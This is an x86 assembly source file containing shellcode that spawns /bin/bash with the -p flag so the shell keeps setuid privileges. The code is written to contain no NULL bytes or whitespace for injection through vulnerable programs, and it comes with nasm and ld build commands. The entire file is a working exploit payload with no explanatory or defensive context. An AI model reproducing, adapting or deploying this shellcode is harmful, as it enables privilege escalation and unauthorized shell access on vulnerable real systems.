;	x86 shellcode to spawn shell
;       No whitespace characters
;       No NULL bytes
;       Will prevent the shell from dropping privilege thereby retaining any setuid privileges
;       by forcing privileged_mode by -p flag
;
;
;	nasm shellcode.asm -f elf32 -o shellcode.obj
;	ld -m elf_i386 shellcode.obj -o shellcode.elf
;


section .text
global _start
_start:
    xor    eax,eax
    push   "hXXX"
    push   "/bas"
    push   "/bin"
    mov    BYTE [esp+0x9], ah
    mov    ebx,esp
    push   "-pXX"
    mov    BYTE [esp+0x2], ah
    mov    edx, esp
    push   eax
    push   edx
    push   ebx
    mov    ecx,esp
    mov    al, 0xe
    dec    eax
    dec    eax
    dec    eax
    mov    edx,DWORD [esp+0x8]
    int    0x80

